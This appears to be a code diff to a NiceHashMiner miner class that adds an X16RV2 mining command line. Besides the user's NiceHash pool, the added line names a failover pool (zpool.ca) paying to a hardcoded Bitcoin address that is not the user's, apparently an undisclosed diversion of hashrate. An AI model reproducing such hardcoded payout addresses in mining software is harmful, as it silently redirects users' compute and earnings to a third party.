@@ -168,6 +168,19 @@ namespace NiceHashMiner.Miners
                 Total = 0.0d;
                 return commandLine;
             }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.X16RV2))
+            {
+                commandLine = "--algo x16rv2" +
+                " --url=stratum+tcp://" + alg + "." + myServers[0, 0] + nhsuff + ".nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                " -o stratum+tcp://x16rv2.eu.mine.zpool.ca:3637" + " -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + " -p c=BTC " +
+                " --log " + GetLogFileName() +
+                apiBind +
+                " -d " + GetDevicesCommandString() + " " +
+                ExtraLaunchParametersParser.ParseForMiningSetup(MiningSetup, DeviceType.NVIDIA) + " ";
+                //   TotalCount = 3;
+                Total = 0.0d;
+                return commandLine;
+            }
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2z))
             {
                 commandLine = "--algo lyra2z" +
